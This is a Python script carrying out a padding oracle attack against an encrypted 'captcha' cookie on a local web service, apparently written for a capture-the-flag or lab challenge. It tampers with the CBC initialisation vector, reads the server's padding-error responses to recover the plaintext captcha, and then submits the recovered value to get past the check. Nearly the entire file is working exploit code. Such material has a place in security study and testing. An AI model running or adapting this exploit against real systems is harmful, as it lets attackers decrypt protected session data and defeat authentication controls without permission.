import base64
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Comprehensive Padding Oracle Attack")
print(f"[+] Cookie value: {target_cookie}")
print(f"[+] Decoded length: {len(cookie_bytes)} bytes")
print(f"[+] Number of blocks: {len(blocks)}")
for i, block in enumerate(blocks):
    print(f"  Block {i}: {block.hex()}")

def make_request(modified_cookie):
    """Make request with modified cookie"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        
        data = {
            'username': 'testuser',
            'captcha': 'test',
            'submit': 'Submit'
        }
        
        resp = session.post(base_url, data=data, timeout=10)
        return resp.text, resp.status_code
    except Exception as e:
        return f"Error: {e}", -1

def is_padding_valid(response_text, status_code):
    """Check if padding is valid based on response"""
    # Valid padding -> "Invalid CAPTCHA!" (403) - content is wrong but padding ok
    if "Invalid CAPTCHA!" in response_text and status_code == 403:
        return True
    # Also consider other short error messages as valid padding
    if len(response_text) < 100 and status_code in [200, 403]:
        return True
    # Invalid padding -> "Invalid padding" message
    if "Invalid padding" in response_text:
        return False
    # Server error -> likely padding error
    if status_code == 500:
        return False
    return True

def decrypt_block(iv, ciphertext, block_num):
    """Decrypt a block using padding oracle"""
    print(f"\n{'='*70}")
    print(f"[*] Decrypting Block {block_num}")
    print(f"[*] IV: {iv.hex()}")
    print(f"[*] Ciphertext: {ciphertext.hex()}")
    print(f"{'='*70}")
    
    decrypted = bytearray(BLOCK_SIZE)
    original_iv = bytearray(iv)
    
    # For each byte position (from last to first)
    for pos in range(BLOCK_SIZE - 1, -1, -1):
        expected_padding = BLOCK_SIZE - pos
        print(f"\n[+] Position {pos:2d} (padding value: {expected_padding}) ", end="", flush=True)
        
        found_guess = None
        test_attempts = 0
        
        # Try all possible byte values
        for guess in range(256):
            test_attempts += 1
            
            # Rate limiting every 100 attempts
            if test_attempts % 100 == 0:
                time.sleep(0.1)
            
            # Create modified IV
            modified_iv = bytearray(original_iv)
            
            # Set all bytes after current position with correct padding
            for i in range(pos + 1, BLOCK_SIZE):
                pad_val = expected_padding
                # XOR: modified_IV[i] = original_IV[i] ^ decrypted[i] ^ pad_val
                modified_iv[i] = original_iv[i] ^ decrypted[i] ^ pad_val
            
            # Set current byte to test
            modified_iv[pos] = original_iv[pos] ^ guess ^ expected_padding
            
            # Create test cookie (IV + ciphertext)
            test_cookie_bytes = modified_iv + ciphertext
            test_cookie = base64.b64encode(test_cookie_bytes).decode()
            
            # Make request to server
            response, status = make_request(test_cookie)
            
            # Check if padding is valid
            if is_padding_valid(response, status):
                found_guess = guess
                char_rep = chr(guess) if 32 <= guess <= 126 else '.'
                print(f"\n[+] Decrypted byte {pos:2d} = 0x{guess:02x} '{char_rep}' ({test_attempts} attempts)")
                break
        
        if found_guess is not None:
            decrypted[pos] = found_guess
        else:
            print(f"\n[-] FAILED to decrypt byte {pos}")
            decrypted[pos] = 0
    
    print(f"\n{'='*70}")
    print(f"[+] Decrypted Intermediate Values: {decrypted.hex()}")
    print(f"{'='*70}")
    
    return bytes(decrypted)

# Verify padding oracle is working
print(f"\n[*] Verifying padding oracle...")
resp_valid, status_valid = make_request(target_cookie)
print(f"  Valid cookie: '{resp_valid}' (status {status_valid})")

test_bad = bytearray(cookie_bytes)
test_bad[15] ^= 0xFF  # Corrupt padding
resp_bad, status_bad = make_request(base64.b64encode(test_bad).decode())
print(f"  Invalid cookie: '{resp_bad}' (status {status_bad})")

# Start the attack
print(f"\n[*] Starting padding oracle attack - this will take time...")
print(f"[*] Progress: ", end="", flush=True)

iv = blocks[0]
ciphertext = blocks[1]

# Decrypt the block
intermediate_values = decrypt_block(iv, ciphertext, 1)

# Calculate actual plaintext: plaintext = intermediate_values XOR IV
plaintext_block = bytearray(BLOCK_SIZE)
for i in range(BLOCK_SIZE):
    plaintext_block[i] = intermediate_values[i] ^ iv[i]

print(f"\n{'='*70}")
print(f"[+] COMPUTED PLAINTEXT (before padding removal)")
print(f"[+] Plaintext: {plaintext_block.hex()}")
print(f"{'='*70}")

# Display each byte
print(f"\n[+] Plaintext byte analysis:")
for i, byte in enumerate(plaintext_block):
    char = chr(byte) if 32 <= byte <= 126 else '.'
    if byte == 0:
        display = '<NULL>'
    elif byte < 32:
        display = f'<ctrl-{byte}>'
    else:
        display = f"'{char}'"
    print(f"  [{i:2d}] 0x{byte:02x} = {display}")

# Remove PKCS#7 padding
padding_len = plaintext_block[-1]
print(f"\n[+] PKCS#7 Padding Analysis:")
print(f"  Last byte value: {padding_len}")

if 1 <= padding_len <= BLOCK_SIZE:
    # Verify padding is correct
    padding_valid = True
    for i in range(1, padding_len + 1):
        if plaintext_block[-i] != padding_len:
            padding_valid = False
            break
    
    if padding_valid:
        actual_plaintext = plaintext_block[:-padding_len]
        print(f"  ✓ Valid padding: {padding_len} byte(s)")
        print(f"  ✓ Plaintext length: {len(actual_plaintext)} bytes")
        print(f"  ✓ Plaintext hex: {actual_plaintext.hex()}")
        
        print(f"\n{'='*70}")
        print(f"[+] DECRYPTED CAPTCHA SOLUTION")
        print(f"{'='*70}")
        
        # Try multiple decodings
        encodings = ['utf-8', 'ascii', 'latin-1']
        for encoding in encodings:
            try:
                solution = actual_plaintext.decode(encoding)
                print(f"  {encoding:8s}: '{solution}'")
            except:
                continue
        
        # Test the decrypted solution
        if len(actual_plaintext) > 0:
            try:
                captcha_solution = actual_plaintext.decode('utf-8')
                print(f"\n[*] Testing solution: '{captcha_solution}'")
                
                session = requests.Session()
                session.cookies.set(cookie_name, target_cookie)
                
                test_data = {
                    'username': 'testuser',
                    'captcha': captcha_solution,
                    'submit': 'Submit'
                }
                
                resp = session.post(base_url, data=test_data, timeout=10)
                print(f"[*] Server response: '{resp.text}' (status: {resp.status_code})")
                
                if "Invalid CAPTCHA!" not in resp.text:
                    print(f"[+] ✓ SUCCESS! Captcha solution is correct!")
                else:
                    # Try common transformations
                    variations = [captcha_solution.strip(), captcha_solution.upper(), captcha_solution.lower()]
                    for var in variations:
                        if var != captcha_solution:
                            print(f"[*] Testing variant: '{var}'")
                            test_data['captcha'] = var
                            resp = session.post(base_url, data=test_data, timeout=10)
                            if "Invalid CAPTCHA!" not in resp.text:
                                print(f"[+] ✓ SUCCESS with variant: '{var}'")
                                break
                    else:
                        print(f"[-] All variants rejected - checking implementation...")
                        
            except Exception as e:
                print(f"[-] Error testing solution: {e}")
    else:
        print(f"  ✗ Invalid padding structure")
else:
    print(f"  ✗ Invalid padding length: {padding_len}")

print(f"\n[+] Attack completed!")
